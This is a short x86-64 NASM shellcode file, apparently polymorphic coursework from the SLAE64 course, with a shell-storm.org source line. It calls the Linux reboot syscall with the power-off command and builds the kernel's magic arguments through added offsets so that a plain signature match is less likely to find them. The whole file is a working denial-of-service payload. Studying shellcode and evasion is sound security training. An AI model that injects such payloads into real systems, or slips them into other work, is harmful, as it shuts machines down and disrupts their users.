; From: http://shell-storm.org/shellcode/files/shellcode-602.php
; Filename: shellcode3.poly.nasm
; Author:  SLAE64 - 1525
;
; Purpose: reboot(POWER_OFF)
BITS 64

section .text
global _start

SYS_REBOOT equ 0xa9
CMD equ 0x4321fedc
 
_start:
    mov edx, CMD
    mov esi, edx
    add esi, 0x1B0FE573 ; 0x28121969
    mov edi, esi
    add edi, 0xD6CFC544 ; 0xfee1dead
    
    push byte SYS_REBOOT
    pop rax
    syscall